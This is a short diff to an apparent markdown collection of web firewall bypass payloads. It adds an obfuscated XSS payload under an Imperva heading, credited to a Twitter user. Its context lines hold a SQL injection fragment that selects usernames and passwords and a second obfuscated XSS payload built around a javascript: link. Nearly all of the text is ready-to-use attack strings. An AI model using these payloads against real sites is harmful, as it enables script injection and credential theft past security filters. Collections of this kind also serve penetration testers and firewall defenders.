@@ -3609,6 +3609,10 @@ amUserId=1 union select username,password,3,4 from users
 ```
 
 ### Imperva
+- [XSS Bypass](https://twitter.com/0xInfection/status/1420046446095519749) by [@0xInfection](https://twitter.com/0xInfection)
+```html
+<x/onclick=globalThis&lsqb;'\u0070r\u006f'+'mpt']&lt;)>clickme
+```
 - [XSS Bypass](https://twitter.com/0xInfection/status/1364622858090016777) by [@0xInfection](https://twitter.com/0xInfection)
 ```html
 <a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />click
